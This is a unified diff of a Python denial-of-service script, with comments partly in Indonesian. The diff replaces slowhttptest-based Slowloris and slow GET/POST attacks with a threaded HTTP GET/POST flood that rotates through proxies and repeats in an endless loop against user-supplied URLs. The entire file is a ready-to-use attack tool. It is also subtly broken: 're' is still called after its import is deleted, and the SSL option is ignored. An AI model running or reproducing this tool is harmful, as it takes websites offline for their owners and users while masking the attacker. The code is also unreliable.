@@ -1,164 +1,170 @@
 #!/usr/bin/env python3
 import threading
 import sys
-import re
 import time
-import os
-import subprocess # Import subprocess module
-import urllib.request, urllib.error, urllib.parse
 import socket
-import argparse # Import argparse for command-line arguments
+import argparse
+import requests
+from requests.exceptions import RequestException, ConnectionError, Timeout
 
-# Global variables (now populated by argparse)
+# --- Konfigurasi Global ---
 TARGET_URLS = []
 PROXY_FILE = "http.txt"
-ATTACK_OPTION = 1
-MAX_THREADS = 50 # Example: limit concurrent threads
-ATTACK_INTERVAL = 60 # Seconds between attack rounds
+ATTACK_OPTION = 1  # 1: GET Flood, 2: POST Flood
+MAX_THREADS = 100  # Batas thread paralel
+ATTACK_INTERVAL = 60 # Jeda antar putaran serangan (detik)
+PROXY_TIMEOUT = 5  # Timeout untuk mencoba koneksi proxy (detik)
+REQUEST_TIMEOUT = 10 # Timeout untuk permintaan HTTP (detik)
+
+# Event untuk memberi sinyal berhenti ke thread
+stop_event = threading.Event()
 
 class AttackThread(threading.Thread):
     """
-    Thread class to run slowhttptest with different proxy configurations.
+    Thread class to perform HTTP GET or POST flood attacks.
     """
     def __init__(self, target_url, attack_option, proxy_address, thread_id):
         self.target_url = target_url
         self.attack_option = attack_option
-        self.proxy_address = proxy_address
+        self.proxy_address = proxy_address # Format: "ip:port"
         self.thread_id = thread_id
-        self.stop_event = threading.Event() # Event to signal thread to stop
         threading.Thread.__init__(self)
 
     def run(self):
         """
-        Executes the slowhttptest command based on the chosen attack option using subprocess.
+        Performs the HTTP flood attack.
         """
-        print(f"[Thread {self.thread_id}] Attacking {self.target_url} via proxy {self.proxy_address}")
-        
-        # Construct the slowhttptest command
-        cmd_args = [
-            "slowhttptest",
-            "-c", "1000", # Number of connections
-            "-r", "200",  # Rate of connections per second
-            "-u", self.target_url,
-            "-p", "15",   # Proxy timeout in seconds
-            "-d", self.proxy_address # Proxy address (format: ip:port)
-        ]
-
-        if self.attack_option == 1: # Slowloris
-            cmd_args.extend([
-                "-B", # Bypass Keep-Alive header
-                "-i", "110", # Interval between connections in milliseconds
-                "-s", "8192", # Socket buffer size
-                "-t", "FFFFFUUUUCCCCKKKKYOUUUUUUUU" # Custom HTTP method
-            ])
-        elif self.attack_option == 2: # Slow HTTP GET
-            cmd_args.extend([
-                "-H", # Use HTTP GET method
-                "-t", "GET",
-                "-i", "10",
-                "-x", "24" # Max connections (adjusted from original -x 24 to match example)
-            ])
-        else: # Slow POST (assuming option 3)
-            cmd_args.extend([
-                "-X", # Use HTTP POST method
-                "-w", "512", # Bytes per chunk
-                "-y", "1024", # First chunk size
-                "-n", "5",   # Number of connection requests
-                "-z", "32",  # Buffer size
-                "-k", "3"    # Keep-alive connections
-            ])
+        proxy = None
+        if self.proxy_address:
+            proxy = {
+                'http': f'http://{self.proxy_address}',
+                'https': f'http://{self.proxy_address}' # Gunakan http:// untuk proxy yang mem-proxy traffic http/https
+            }
 
         try:
-            # Execute the command using subprocess.Popen
-            # This allows for better control and capturing output/errors
-            process = subprocess.Popen(cmd_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-            
-            # Optional: Monitor the process for a limited time or until it finishes
-            # For simplicity, we'll let it run. In a real scenario, you might want to
-            # check process.poll() or use process.wait(timeout=...)
-            # Here, we're not actively capturing output, but stderr can be useful.
+            print(f"[Thread {self.thread_id}] Attacking {self.target_url} via proxy {self.proxy_address if self.proxy_address else 'direct'}")
 
-            # Wait for a short period or until the process exits
-            # If the process is still running after a certain time, we might consider it 'stuck'
-            # For this example, we'll just let it run and rely on the timeout in '-p 15'
-            stdout, stderr = process.communicate(timeout=30) # Add a process timeout
+            while not stop_event.is_set():
+                try:
+                    if self.attack_option == 1: # GET Flood
+                        # Mengirim permintaan GET
+                        response = requests.get(
+                            self.target_url,
+                            proxies=proxy,
+                            timeout=REQUEST_TIMEOUT,
+                            verify=False # Abaikan sertifikat SSL jika https
+                        )
+                        # Anda bisa menambahkan pemeriksaan response.status_code jika perlu
+                        # print(f"[Thread {self.thread_id}] GET {self.target_url} Status: {response.status_code}")
 
-            if process.returncode != 0:
-                print(f"[Thread {self.thread_id}] Error executing command for {self.target_url}: {stderr.strip()}")
-            # else:
-            #     print(f"[Thread {self.thread_id}] Command successful for {self.target_url}")
+                    elif self.attack_option == 2: # POST Flood
+                        # Mengirim permintaan POST (contoh dengan data kosong)
+                        response = requests.post(
+                            self.target_url,
+                            proxies=proxy,
+                            data={}, # Data kosong atau data dummy
+                            timeout=REQUEST_TIMEOUT,
+                            verify=False
+                        )
+                        # print(f"[Thread {self.thread_id}] POST {self.target_url} Status: {response.status_code}")
 
-        except subprocess.TimeoutExpired:
-            print(f"[Thread {self.thread_id}] Command timed out for {self.target_url}.")
-            process.kill() # Ensure the process is terminated
+                except ConnectionError:
+                    # Jika koneksi gagal melalui proxy, mungkin proxy mati atau tidak dapat dijangkau
+                    # Anda bisa menandai proxy ini untuk diperiksa nanti atau melewatinya
+                    # print(f"[Thread {self.thread_id}] Connection error with proxy {self.proxy_address} to {self.target_url}")
+                    break # Hentikan thread jika proxy gagal
+                except Timeout:
+                    # Timeout permintaan
+                    # print(f"[Thread {self.thread_id}] Request timeout for {self.target_url} via proxy {self.proxy_address if self.proxy_address else 'direct'}")
+                    pass # Coba lagi jika timeout
+                except RequestException as e:
+                    # Kesalahan lain dari library requests
+                    # print(f"[Thread {self.thread_id}] Request error: {e}")
+                    break # Hentikan thread jika ada kesalahan serius
+                except Exception as e:
+                    # Tangani error tak terduga lainnya
+                    print(f"[Thread {self.thread_id}] Unexpected error: {e}")
+                    break
+
+                # Jeda singkat antar permintaan per thread (opsional, bisa diatur)
+                time.sleep(0.1) # Jeda 100 ms
+
         except KeyboardInterrupt:
-            print(f"\n[Thread {self.thread_id}] Keyboard interrupt detected. Stopping thread.")
-            self.stop_event.set()
-            process.kill()
-        except FileNotFoundError:
-            print(f"[Thread {self.thread_id}] Error: 'slowhttptest' command not found. Is it installed and in your PATH?")
-            self.stop_event.set()
-        except Exception as detail:
-            print(f"[Thread {self.thread_id}] Unexpected error: {detail}")
-            self.stop_event.set()
-        
-        # Signal that this thread is done (or stopped)
-        # No need to call super().run() if we handle everything here.
-        # If we wanted to chain, we'd call it.
+            # Tangani jika interupsi terjadi di dalam thread
+            stop_event.set()
+        finally:
+            # Jika thread selesai atau diinterupsi
+            pass
 
-def check_proxy(proxy_address, timeout=5):
+def check_proxy(proxy_address, timeout=PROXY_TIMEOUT):
     """
-    Checks if a proxy is alive by attempting a simple connection.
-    Returns True if the proxy is likely alive, False otherwise.
+    Checks if a proxy is alive by attempting a simple HTTP HEAD request.
+    Returns True if the proxy is likely alive and responds, False otherwise.
     """
+    if not proxy_address:
+        return True # Langsung dianggap hidup jika tidak ada proxy yang digunakan
+
+    proxy_dict = {
+        'http': f'http://{proxy_address}',
+        'https': f'http://{proxy_address}'
+    }
     try:
-        # Try to establish a socket connection to the proxy
-        # For HTTP proxies, the proxy listens on the specified IP and port
-        host, port_str = proxy_address.split(':')
-        port = int(port_str)
-        
-        s = socket.create_connection((host, port), timeout=timeout)
-        s.close()
+        # Coba lakukan permintaan HEAD singkat ke URL dummy atau salah satu target
+        # Menggunakan URL yang sangat kecil atau tidak valid bisa menghemat waktu
+        # Tapi lebih baik menggunakan target yang sebenarnya jika memungkinkan
+        requests.head(
+            "http://httpbin.org/get", # URL yang cepat merespons
+            proxies=proxy_dict,
+            timeout=timeout,
+            verify=False # Abaikan sertifikat SSL
+        )
         return True
-    except (socket.timeout, ConnectionRefusedError, OSError, ValueError):
+    except (ConnectionError, Timeout, RequestException, ValueError):
         return False
 
-def load_proxies(proxy_file_path):
+def load_proxies(proxy_file_path, check_proxies=False):
     """
-    Loads proxies from a file and returns a list of valid proxy addresses.
-    Optionally filters out invalid ones.
+    Loads proxies from a file and optionally filters out invalid ones.
     """
-    valid_proxies = []
+    proxies = []
     try:
         with open(proxy_file_path, "rb") as fo:
-            for proxy_line in fo:
-                proxy_address = proxy_line.decode().strip()
+            for line in fo:
+                proxy_address = line.decode().strip()
                 if not proxy_address:
                     continue
                 
-                # Basic validation of proxy format (ip:port)
+                # Validasi format dasar (ip:port)
                 if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", proxy_address):
-                    # Optional: uncomment the line below to actively check each proxy
-                    # if check_proxy(proxy_address):
-                    #     valid_proxies.append(proxy_address)
-                    # else:
-                    #     print(f"[-] Proxy {proxy_address} appears to be dead. Skipping.")
-                    valid_proxies.append(proxy_address) # Add all proxies for now, rely on slowhttptest timeout
+                    if check_proxies:
+                        if check_proxy(proxy_address):
+                            proxies.append(proxy_address)
+                            print(f"[+] Proxy {proxy_address}: LIVE")
+                        else:
+                            print(f"[-] Proxy {proxy_address}: DEAD (skipped)")
+                    else:
+                        proxies.append(proxy_address) # Tambahkan semua tanpa pengecekan
                 else:
                     print(f"[-] Invalid proxy format in file: {proxy_address}. Skipping.")
     except FileNotFoundError:
         print(f"[!] Error: Proxy file '{proxy_file_path}' not found.")
-        sys.exit(1)
+        if not check_proxies: # Jika tidak memeriksa proxy, kita bisa lanjut tanpa proxy
+             print("    Continuing without proxies.")
+             return [] # Kembalikan list kosong jika file tidak ada tapi tidak wajib
+        else:
+             sys.exit(1) # Keluar jika file proxy wajib dan tidak ditemukan
     except Exception as detail:
         print(f"[!] An unexpected error occurred while loading proxies: {detail}")
         sys.exit(1)
         
-    if not valid_proxies:
-        print(f"[!] No valid proxies found in {proxy_file_path}. Exiting.")
+    if not proxies and not check_proxies:
+        print(f"[+] No proxies found in {proxy_file_path}. Will attack directly.")
+    elif not proxies and check_proxies:
+        print(f"[!] No live proxies found in {proxy_file_path} after checking. Exiting.")
         sys.exit(1)
         
-    print(f"[+] Loaded {len(valid_proxies)} proxies.")
-    return valid_proxies
+    print(f"[+] Loaded {len(proxies)} proxies.")
+    return proxies
 
 def dos(target_urls, attack_option, proxy_list):
     """
@@ -168,38 +174,45 @@ def dos(target_urls, attack_option, proxy_list):
     threads = []
     proxy_index = 0
     num_proxies = len(proxy_list)
+    
+    print(f"[*] Starting attack on {', '.join(target_urls)} with {num_proxies} proxies.")
 
-    if num_proxies == 0:
-        print("[!] No proxies available to start the attack.")
-        return
-
-    for target_url_item in target_urls:
-        if not (target_url_item.startswith("http://") or target_url_item.startswith("https://")):
-            print(f"[-] Skipping invalid URL format: {target_url_item} (must start with http:// or https://)")
+    for url_item in target_urls:
+        if not (url_item.startswith("http://") or url_item.startswith("https://")):
+            print(f"[-] Skipping invalid URL format: {url_item} (must start with http:// or https://)")
             continue
 
-        # Distribute proxies among URLs
-        for i in range(min(len(proxy_list), MAX_THREADS // len(target_urls) + 1)): # Simple distribution
-            proxy_address = proxy_list[proxy_index % num_proxies]
-            proxy_index += 1
+        # Tentukan berapa banyak thread per URL. Ini sederhana, bisa ditingkatkan.
+        # Pastikan tidak melebihi MAX_THREADS secara total.
+        num_threads_for_url = max(1, MAX_THREADS // len(target_urls)) # Minimal 1 thread per URL
+        
+        for i in range(num_threads_for_url):
+            if len(threads) >= MAX_THREADS:
+                break # Hentikan jika sudah mencapai batas thread
+
+            proxy_to_use = None
+            if num_proxies > 0:
+                proxy_to_use = proxy_list[proxy_index % num_proxies]
+                proxy_index += 1
             
             thread_id = len(threads) + 1
-            thread = AttackThread(target_url_item, attack_option, proxy_address, thread_id)
+            thread = AttackThread(url_item, attack_option, proxy_to_use, thread_id)
             threads.append(thread)
             thread.start()
+            
+            # Tambahkan jeda kecil jika kita membuat banyak thread dengan cepat
+            if i % 10 == 0:
+                 time.sleep(0.01)
 
-            if len(threads) >= MAX_THREADS:
-                print(f"[!] Reached maximum thread limit ({MAX_THREADS}). Waiting for some to finish.")
-                # Wait for one thread to finish to free up a slot (basic throttling)
-                for t in threads:
-                    if not t.is_alive():
-                        threads.remove(t)
-                        break
-                time.sleep(1) # Short pause before checking again
+        if len(threads) >= MAX_THREADS:
+            print(f"[!] Reached maximum thread limit ({MAX_THREADS}). Waiting for threads to start/finish...")
+            # Tunggu sebentar atau sampai ada thread yang selesai untuk membuat slot baru
+            time.sleep(1) # Jeda singkat sebelum putaran berikutnya
 
-    # Wait for all active threads to complete
+    # Tunggu semua thread yang masih berjalan untuk selesai
     for thread in threads:
-        thread.join()
+        if thread.is_alive():
+            thread.join()
     
     print("[+] All attack threads for this batch have finished.")
 
@@ -208,13 +221,13 @@ def main():
     Main function to parse arguments and start the attack loop.
     """
     parser = argparse.ArgumentParser(
-        description="Slow HTTP DoS Attack Tool using slowhttptest.",
-        formatter_class=argparse.RawTextHelpFormatter # Helps format description nicely
+        description="HTTP Flood Attack Tool using Python Requests.",
+        formatter_class=argparse.RawTextHelpFormatter
     )
     parser.add_argument(
         "urls",
         metavar="URL",
-        nargs="+", # Expect one or more URLs
+        nargs="+",
         help="Target URL(s) to attack (e.g., http://example.com or https://secure.example.org)"
     )
     parser.add_argument(
@@ -226,17 +239,16 @@ def main():
         "-o", "--option",
         type=int,
         default=1,
-        choices=[1, 2, 3], # Allow only options 1, 2, or 3
+        choices=[1, 2], # Opsi hanya 1 (GET) atau 2 (POST)
         help="Attack option:\n"
-             "1: Slowloris (default)\n"
-             "2: Slow HTTP GET\n"
-             "3: Slow POST"
+             "1: HTTP GET Flood (default)\n"
+             "2: HTTP POST Flood"
     )
     parser.add_argument(
         "-t", "--max-threads",
         type=int,
-        default=50,
-        help="Maximum number of concurrent threads to run.\nDefault: 50"
+        default=100,
+        help="Maximum number of concurrent threads to run.\nDefault: 100"
     )
     parser.add_argument(
         "-i", "--interval",
@@ -246,61 +258,82 @@ def main():
     )
     parser.add_argument(
         "--check-proxies",
-        action="store_true", # If this flag is present, it's True
-        help="Actively check if proxies are alive before starting the attack.\nThis can take a long time if you have many proxies."
+        action="store_true",
+        help="Actively check if proxies are alive before starting the attack.\nThis can take a long time."
     )
+    parser.add_argument(
+        "--no-verify-ssl",
+        action="store_false", # default is True, so if flag is present, set to False
+        dest="verify_ssl", # store value in args.verify_ssl
+        help="Do not verify SSL certificates for HTTPS targets. Use with caution."
+    )
+    parser.add_argument(
+        "-pt", "--proxy-timeout",
+        type=int,
+        default=5,
+        help="Timeout in seconds for checking proxy connectivity.\nDefault: 5"
+    )
+    parser.add_argument(
+        "-rt", "--request-timeout",
+        type=int,
+        default=10,
+        help="Timeout in seconds for each HTTP request.\nDefault: 10"
+    )
+
 
     args = parser.parse_args()
 
-    global TARGET_URLS, PROXY_FILE, ATTACK_OPTION, MAX_THREADS, ATTACK_INTERVAL
+    # Set global variables from args
+    global TARGET_URLS, PROXY_FILE, ATTACK_OPTION, MAX_THREADS, ATTACK_INTERVAL, PROXY_TIMEOUT, REQUEST_TIMEOUT
     TARGET_URLS = args.urls
     PROXY_FILE = args.proxy_file
     ATTACK_OPTION = args.option
     MAX_THREADS = args.max_threads
     ATTACK_INTERVAL = args.interval
+    PROXY_TIMEOUT = args.proxy_timeout
+    REQUEST_TIMEOUT = args.request_timeout
 
-    print("--- Starting DoS Attack Configuration ---")
+    # Nonaktifkan peringatan InsecureRequestWarning jika --no-verify-ssl digunakan
+    if not args.verify_ssl:
+        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+    print("--- Starting HTTP Flood Attack Configuration ---")
     print(f"Target URLs: {TARGET_URLS}")
     print(f"Proxy File: {PROXY_FILE}")
-    print(f"Attack Option: {ATTACK_OPTION}")
+    print(f"Attack Option: {'GET Flood' if ATTACK_OPTION == 1 else 'POST Flood'}")
     print(f"Max Concurrent Threads: {MAX_THREADS}")
     print(f"Attack Interval: {ATTACK_INTERVAL} seconds")
     print(f"Check Proxies Actively: {'Yes' if args.check_proxies else 'No'}")
-    print("---------------------------------------")
+    print(f"SSL Verification: {'Enabled' if args.verify_ssl else 'Disabled'}")
+    print(f"Proxy Timeout: {PROXY_TIMEOUT}s")
+    print(f"Request Timeout: {REQUEST_TIMEOUT}s")
+    print("---------------------------------------------")
     
     # Load proxies
-    proxy_list = load_proxies(PROXY_FILE)
+    proxy_list = load_proxies(PROXY_FILE, args.check_proxies)
     
-    # If user wants to check proxies actively, do it here
-    if args.check_proxies:
-        print("\n--- Actively checking proxies... ---")
-        alive_proxies = []
-        for i, proxy in enumerate(proxy_list):
-            if check_proxy(proxy):
-                alive_proxies.append(proxy)
-                print(f"[{i+1}/{len(proxy_list)}] Proxy {proxy}: LIVE")
-            else:
-                print(f"[{i+1}/{len(proxy_list)}] Proxy {proxy}: DEAD")
-        
-        if not alive_proxies:
-            print("[!] No live proxies found after checking. Exiting.")
-            sys.exit(1)
-        proxy_list = alive_proxies # Use only live proxies
-        print(f"--- {len(alive_proxies)} live proxies found. ---")
-        time.sleep(2) # Short pause before starting attacks
+    # Jika tidak ada proxy dan tidak ada --no-proxy-required, kita bisa lanjut menyerang langsung.
+    # Namun, jika pengguna secara eksplisit meminta proxy dan tidak ada yang valid, kita keluar.
+    if not proxy_list and args.check_proxies:
+         print("[!] No live proxies found. Exiting.")
+         sys.exit(1)
 
     # Infinite loop to continuously run the DoS attack
-    while True:
-        print(f"\n--- Starting DoS attack round ---")
-        dos(TARGET_URLS, ATTACK_OPTION, proxy_list)
-        print("\n--- Attack round finished ---")
-        
-        print(f"Waiting for {ATTACK_INTERVAL} seconds before next attack round...")
-        time.sleep(ATTACK_INTERVAL)
+    try:
+        while True:
+            print(f"\n--- Starting DoS attack round ---")
+            dos(TARGET_URLS, ATTACK_OPTION, proxy_list)
+            print("\n--- Attack round finished ---")
+            
+            print(f"Waiting for {ATTACK_INTERVAL} seconds before next attack round...")
+            time.sleep(ATTACK_INTERVAL)
+    except KeyboardInterrupt:
+        print("\n[!] Attack interrupted by user. Signalling threads to stop...")
+        stop_event.set() # Beri sinyal ke semua thread untuk berhenti
+        # Tunggu sebentar agar thread sempat berhenti
+        time.sleep(2)
+        print("[!] Exiting gracefully.")
+        sys.exit(0)
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\n[!] Attack interrupted by user. Exiting gracefully.")
-        sys.exit(0)
+    main()
